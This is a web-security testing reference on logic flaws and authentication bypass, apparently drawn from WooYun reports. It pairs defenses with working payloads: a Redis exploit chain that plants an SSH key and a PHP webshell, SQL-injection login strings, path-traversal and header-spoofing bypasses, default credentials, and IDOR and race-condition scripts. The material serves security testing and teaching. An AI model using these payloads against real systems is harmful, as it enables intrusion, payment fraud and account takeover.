# Web Logic and Authentication Security

> **Source**: distilled from 88,636 real WooYun vulnerabilities, covering logic flaws (8,292) and unauthorized access (14,377)
> **Purpose**: a practical reference for logic flaws and authentication bypass in web-application security testing

---

## 1. Authorization (Access-Control) Flaws

### 1.1 Nature of the Vulnerability

The root cause of authorization flaws is **missing or incomplete authorization checks** -- the server does not verify on every resource operation that the requester has the right permission.

| Type | Definition | Root cause | Risk level |
|------|------|------|----------|
| Horizontal escalation | Cross-access between peer users | Resource ownership not checked | High |
| Vertical escalation | Low-privilege user performing high-privilege actions | Role permissions not checked | Critical |

### 1.2 Horizontal Escalation (IDOR)

**High-frequency scenarios and exploitation:**

```
Scenario 1: ID enumeration -- auto-increment IDs are predictable
GET /address/edit/?addid=100001  -> your own address
GET /address/edit/?addid=100002  -> another person's address (authorization bypass)

Scenario 2: resource-replacement attack -- update operations lack ownership checks
Account A creates invoice ID=1001 -> account B swaps ID=1001 while editing -> A's invoice is overwritten

Scenario 3: API-parameter enumeration -- the endpoint checks login but not permissions
/personal/center/family/{id}/edit -> swap the id to leak others' info
```

**Testing method:**
1. Capture and record the ID parameters in normal requests (uid/orderId/addid, etc.)
2. Replace with another user's ID and observe the response
3. Automate enumeration (Burp Intruder or a script)
4. Focus on the four CRUD operations; update and delete are the most damaging

```python
# IDOR automated-detection approach
def idor_test(base_url, param_name, id_range, session_cookie):
    for id in range(id_range[0], id_range[1]):
        resp = requests.get(
            f"{base_url}?{param_name}={id}",
            cookies={"session": session_cookie}
        )
        if resp.status_code == 200 and "sensitive-data marker" in resp.text:
            print(f"[!] IDOR: {param_name}={id}")
```

**Authorization-testing matrix:**

| Operation type | Test method | Risk level |
|----------|----------|----------|
| Read | Replace the resource ID | Medium |
| Update | Replace the resource ID + data | High |
| Delete | Replace the resource ID | Critical |
| Create | Replace the owner user ID | High |

### 1.3 Vertical Escalation

**Core exploitation methods:**

```http
# a normal user tampers with the role field when editing their profile
POST /updateUser HTTP/1.1
user.aid=3&user.name=test   # aid=3 normal user

# tamper to become admin
POST /updateUser HTTP/1.1
user.aid=1&user.name=test   # aid=1 superadmin
```

**Detection key points:**
- Enumerate role IDs: usually 1=superadmin, 2=admin, 3+=normal user
- Test role switching: modify the role field in the request (role/aid/type/level)
- A low-privilege account directly accessing an admin endpoint URL
- Tamper with the privilege field: `isAdmin=0->1`, `role=user->admin`

### 1.4 Defenses

- Enforce ownership before resource access: `WHERE id=? AND user_id=<current user>`
- Use UUIDs instead of auto-increment IDs to prevent enumeration
- Log sensitive operations to an audit log
- Apply least privilege; authorize per endpoint on the back end
- Centralize access-control logic (middleware/interceptor)

---

## 2. Payment-Logic Flaws

### 2.1 Nature of the Vulnerability

The core of a payment flaw is a **misplaced trust boundary** -- sensitive logic like price calculation is pushed to the client and the server does not validate it independently.

```
Security model: untrusted zone (client) -> trust boundary -> trusted zone (server)
Wrong implementation: accepting the client-submitted price as authoritative
Correct implementation: the client only provides the item ID; the server looks up and computes the price independently
```

### 2.2 Common Scenarios and Exploitation Techniques

**Scenario 1: direct amount tampering**

```http
# original request
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":299.00}

# tamper with the request
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":0.01}
```

**Scenario 2: coupon/discount-logic abuse**

```
1. Buy item A (59 yuan), triggering "spend 59, add-on purchase B (5.9 yuan)"
2. Order A+B, pay 64.9 yuan
3. Cancel item A, keep only B
4. Effectively buy item B (originally 21 yuan) for 5.9 yuan

Testing ideas: partial cancel after a combined order, return after using a coupon, refund after redeeming points
```

**Scenario 3: virtual-currency farming**
- Referral registration grants points -> brute-force the code to mass-register -> redeem points for goods

**Scenario 4: quantity/negative-number attack**
- `count=1 -> count=-1` (a negative causes a refund)
- `price=100 -> price=-100` (negative amount)

### 2.3 Systematic Testing Method

```
Phase 1: parameter fingerprinting
  - Capture the order-creation endpoint
  - Identify price parameters (price/amount/total/cost/discount)
  - Determine the parameter type (integer/float/string)

Phase 2: boundary-value testing
  - Minimum values: 0, 0.01
  - Negatives: -1, -100, -0.01
  - Formats: scientific notation (1e-10), JSON nesting
  - Precision: float overflow, rounding errors

Phase 3: logic bypass
  - Parameter redundancy: submit multiple price parameters
  - Parameter override: raise the price then lower it
  - Coupon stacking: manipulate both price and discount
  - Partially cancel/return after a combined order

Phase 4: validation at each step of the payment flow
  - Order creation -> check the order amount
  - Payment redirect -> verify the payment amount
  - Payment callback -> forge the callback signature
  - Refund flow -> check the refund amount
```

**Advanced exploitation techniques:**

```python
# price tampering + race condition
import threading
def create_order():
    requests.post("/order/create", json={"price":0.01,"productId":"premium"})
threads = [threading.Thread(target=create_order) for _ in range(50)]
for t in threads: t.start()
```

```http
# parameter pollution: some frameworks handle duplicate parameters
POST /order/create?price=299.00&price=0.01

# type-conversion bypass
{"price":"0.01"}     string
{"price":1e-10}      scientific notation
{"price":null}       NULL injection
```

### 2.4 Defenses

```
Layer 1 input validation: accept only the item ID, not the price; amount positive, at most 2 decimals
Layer 2 business logic: the server computes the price independently; reject / manually review when the price deviates beyond a threshold
Layer 3 data integrity: order signing (HMAC) prevents tampering; timestamp prevents replay; idempotency prevents duplication
Layer 4 payment verification: callback amount = order amount; strict state machine; end-to-end audit logs
```

---

## 3. Password-Reset Flaws

### 3.1 Nature of the Vulnerability

The essence of a password-reset flaw is a **broken identity-verification chain** -- some step in the flow does not correctly bind the user identity.

### 3.2 Four Vulnerability Patterns

**Pattern A: verification code echoed/leaked**

```http
POST /sendSmsCode HTTP/1.1
phone=13888888888

# the response contains the verification code directly
{"code":0,"data":{"verifyCode":"123456"}}
```

Detection method: intercept the response that sends the code and search for a 4-6 digit number.

**Pattern B: verification code not bound to the user**

```
1. Receive verification code A on your own phone number
2. Start password recovery on the target account
3. Complete verification with code A (not bound to a user identity)
Root cause: the code is only checked for validity, not for which user it belongs to.
```

**Pattern C: reset step can be skipped**

```
Normal: enter the account -> verify identity -> reset the password -> done
Attack: enter the account -> [skip] -> directly access the reset-password page

Implementation:
1. Analyze the front-end JS to find each step's URL
2. Directly access the step-3 URL
3. Use F12 to edit the DOM: hide the verification step, show the reset step
```

**Pattern D: credential parameter is controllable**

```http
POST /resetPassword HTTP/1.1
username=victim&newPassword=hacked123
# vuln: username comes from the client and can be changed to any user
```

### 3.3 Testing Workflow

```
Start a password reset
  +-- capture and analyze the response -> does it contain the code -> Pattern A
  +-- analyze the verification flow
  |     +-- multi-step -> try skipping intermediate steps -> Pattern C
  |     +-- single step -> check parameter binding
  |           +-- user ID controllable -> parameter tampering -> Pattern D
  |           +-- bound to session -> session-fixation test
  +-- verification-code mechanism
        +-- is the code bound to the user -> Pattern B
        +-- is the code brute-forceable (no rate limit)
        +-- does the code expire
```

### 3.4 Defenses

- Bind the code to the user's session and verify ownership
- The code is single-use and expires in 60 seconds
- The reset token is single-use and unpredictable
- Server-side state validation across the whole flow; no step-skipping
- Lock after 5 failures to prevent brute force

---

## 4. Business-Logic Flaws

### 4.1 Nature of the Vulnerability

Root-cause matrix of business-logic flaws:

| Tier | Flaw type | Typical manifestation |
|------|----------|----------|
| Business layer | Flow-design flaws | Steps skippable, state forgeable |
| API layer | Over-trusting parameters | Client-side validation, server does not verify |
| Authentication layer | Credential-management flaws | Token leakage, session fixation |
| Authorization layer | Blurry permission boundaries | Horizontal/vertical escalation |

### 4.2 CAPTCHA Bypass

**Bypass 1: verification code is not refreshed**
- The code is not auto-refreshed after a failed login, so the same code can be reused
- Exploitation: identify once by hand, then brute-force the password with a fixed code

**Bypass 2: verification code is brute-forceable**
- 4-6 digits, no attempt/rate limit
- Brute-force space 10000-1000000; ~30 seconds with 30 threads

**Bypass 3: front-end-only validation**
- The code is validated only in front-end JS; bypass it by deleting the front-end code or calling the API directly

**CAPTCHA-security checklist:**
- Is the code leaked in the response
- Is it bound to the session/user
- Does it expire (recommend 60 seconds)
- Is a refresh forced on failed validation
- Is there a rate limit (recommend 5/minute)
- Is the complexity sufficient (recommend 6 alphanumeric chars)

### 4.3 Race Conditions

Applicable scenarios: coupon use, points redemption, inventory decrement, balance payment

```python
import threading, requests
def redeem():
    requests.post("/redeem", data={"points":1000, "item":"iPhone"})

# 100 concurrent requests, trying to redeem the same points multiple times
threads = [threading.Thread(target=redeem) for _ in range(100)]
for t in threads: t.start()
```

Root cause: checking and deducting the balance are not atomic, so under concurrency the check can pass multiple times.

### 4.4 Systematic Parameter-Tampering Method

| Parameter type | Tampering direction | Example |
|----------|----------|------|
| User ID | Replace with another user | uid=1001->1002 |
| Amount | Reduce / zero out / negative | price=100->0.01 |
| Quantity | Negative | count=1->-1 |
| State | Flip a boolean | isPaid=false->true |
| Role | Escalate privileges | role=user->admin |
| Time | Extend validity | expireTime->2099-12-31 |

### 4.5 Business-Process Reverse-Analysis Method

```
Step 1: draw the complete business-process diagram
Step 2: identify the validation point at each step
Step 3: assess whether validation is bypassable (front/back end? replayable? parameters controllable?)
Step 4: design bypass test cases

Example (password-reset flow):
[enter account] -> [send code] -> [verify identity] -> [set new password]
     |              |              |              |
  Account enumeration      Code leakage      Step skipping      Parameter tampering
```

### 4.6 Defensive Principles

- **Server authoritative**: all validation happens server-side; front-end validation is only for UX
- **Atomic operations**: use transactions + locks for critical business (debits/inventory)
- **State machine**: the business flow advances strictly through the state machine; no step-skipping
- **Anti-replay**: make critical endpoints idempotent; include a timestamp + signature

---

## 5. Authentication Bypass

### 5.1 Nature of the Vulnerability

The core of authentication bypass is a **broken trust chain**: the system wrongly trusts an identity claim from an untrusted source.

### 5.2 Cookie/Session Forgery

```
# write directly to the cookie to gain an identity
GET /registeruser/CookInsert?userAccount=admin&inner=1
-> write an admin identity into the cookie to get an admin session directly

# The identity token in the cookie is predictable
Cookie: admin=true; userId=1
-> change the cookie value to switch identity
```

JWT bypass:

| Technique | Payload |
|------|---------|
| none algorithm | alg: none |
| Weak key | Brute-force the HS256 secret |
| Algorithm confusion | RS256 to HS256, sign with the public key |

### 5.3 Response-Tampering Bypass

```
Normal: request verification -> {"status":"0","msg":"wrong code"} -> stay on the verification page
Attack: request verification -> intercept the response -> change it to {"status":"1","msg":"success"} -> proceed to the next step
```

Applicable when: the client controls the flow by response status AND the server does not re-validate later steps.

### 5.4 IP Spoofing / Header Bypass

```http
# common headers to bypass an IP allowlist
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Host: localhost
```

### 5.5 Path Bypass

```
# case obfuscation
/ADMIN/  /Admin/  /aDmIn/

# URL-encoding bypass
%2e%2e%2f = ../
%252e%252e%252f = ../ (double encoding)

# null-byte truncation
../../../etc/passwd%00.jpg

# append a suffix to bypass
/admin -> /admin/  /admin;.js  /admin%23
```

### 5.6 Unauthorized Backend Access

High-frequency unauthorized paths:

```
# Web middleware
/console/              (WebLogic)
/manager/html          (Tomcat)
/jmx-console/          (JBoss)
/actuator/env          (Spring Boot)
/actuator/heapdump     (Spring Boot, can leak passwords)

# API endpoint
/swagger-ui.html       (API docs)
/api-docs              (API docs)
/api/configs           (config leakage)

# debug/admin
/admin/index.jsp
/phpMyAdmin/
/druid/index.html      (Druid monitor)
```

Middleware weak-credential quick-reference:

| Middleware | Common weak credentials |
|--------|-----------|
| Tomcat | admin:admin, tomcat:tomcat |
| WebLogic | weblogic:weblogic, weblogic:12345678 |
| JBoss | admin:admin (or no auth) |

### 5.7 Unauthorized Database/Service Access

| Service | Port | Verification command | Exploitation |
|------|------|----------|----------|
| Redis | 6379 | redis-cli -h IP info | Write SSH key / webshell / cron job |
| MongoDB | 27017 | mongo IP:27017 | No-auth direct connect, export all data |
| Elasticsearch | 9200 | curl IP:9200/_cat/indices | Read index data |
| Memcached | 11211 | echo stats, nc IP 11211 | Data leakage |
| Docker API | 2375 | curl IP:2375/info | Container escape / RCE |

Unauthorized-Redis exploit chain (critical):

```bash
redis-cli -h target
# write an SSH public key
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n"
save

# write a webshell
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php system($_GET['c']);?>"
save
```

### 5.8 Session Bypass

```
# Session-ID leakage (logs/URL)
/logs/ctp.log -> contains a session ID -> use it directly

# Session-fixation attack
Force the user to use an attacker-specified session ID

# Session prediction
A weak session generated from a timestamp/sequence number -> the next session is predictable
```

### 5.9 Universal Password (SQL-Injection Login)

```
Username: ' or 1=1--
Password:   anything

Username: admin'--
Password:   anything
```

### 5.10 Authentication-Bypass Test Checklist

| Test item | Method | Tool |
|--------|------|------|
| Cookie forgery | Modify the user-identifier field | BurpSuite |
| Session fixation | Reuse another's session | A capture tool |
| Response tampering | Modify the returned status code | BurpSuite |
| IP spoofing | Add X-Forwarded-For | curl/Burp |
| Front-end bypass | Modify the JS logic | DevTools |
| JWT tampering | none algorithm / weak key | jwt.io/hashcat |
| Path bypass | Case / encoding / truncation | Manual + wordlist |
| Weak credentials | Try default credentials | Hydra |
| SQL-injection login | Universal password | Manual |

### 5.11 Defenses

| Layer | Measure |
|------|------|
| Network | Do not expose internal services publicly; access via VPN/bastion |
| Authentication | Enforce strong passwords, disable default accounts, enable MFA |
| Authorization | Check permissions per endpoint on the back end, least privilege |
| Session | Regenerate the session ID after login, HttpOnly+Secure |
| Monitoring | Anomalous-login alerts, lockout on failed attempts, audit logging |
| Hardening | Disable debug endpoints, remove default admin pages |

---

## 6. Systematic Testing Framework

### 6.1 Four-Phase Testing Method

```
Phase 1: intelligence gathering
  - Enumerate all features and endpoints
  - Draw the business-process diagram
  - Identify sensitive operations (payment/reset/permission change)
  - Determine how controllable the parameter is

Phase 2: threat modeling
  - Analyze each endpoint's input parameters and trust boundaries
  - Mark server-side vs front-end validation
  - Build an attack tree (categorized by authorization/payment/auth)
  - Priority ordering (high impact x high likelihood)

Phase 3: vulnerability verification
  - Test items one by one in priority order
  - Record a PoC (request/response screenshots)
  - Assess the impact scope (data volume / users / amount)

Phase 4: report output
  - Vulnerability description + reproduction steps
  - Root-cause analysis + impact assessment
  - Remediation advice (short-term + long-term)
  - Risk rating (CVSS)
```

### 6.2 High-Frequency Vulnerability-Pattern Quick-Reference

| Vulnerability pattern | Detection signal | Quick verification |
|----------|----------|-------------|
| IDOR | URL/params contain an auto-increment ID | Swap the ID to see if it returns others' data |
| Amount tampering | Request contains price/amount | Set to 0.01 and observe the order |
| Code echo | Capture after sending the code | Search the response for a 4-6 digit number |
| Step skipping | Multi-step flow | Access later steps' URLs directly |
| Response tampering | The client redirects based on status | Set status=1 and see if it passes |
| Unauthorized backend | Directory scan finds admin paths | Access directly to see if login is required |
| Weak credentials | Found a login page | Try default credentials like admin/admin |
| Race condition | Balance/inventory/coupon operations | Send 50+ concurrent requests, watch for double-spend |

### 6.3 Recommended Tools

| Tool | Core use | Applicable scenario |
|------|----------|----------|
| BurpSuite | Traffic interception, parameter tampering, replay | Core tool for all scenarios |
| Postman | API testing, batch requests | Endpoint-logic testing |
| Hydra | Password brute force | Weak passwords / credential stuffing |
| OWASP ZAP | Automated scanning | Initial discovery |
| Custom script | Concurrency testing, ID enumeration | Race conditions / IDOR |

---

*Document version: v1.0*
*Data source: WooYun vulnerability database (88,636 entries): logic flaws (8,292) + unauthorized access (14,377)*
*Generated: 2026-02-06*
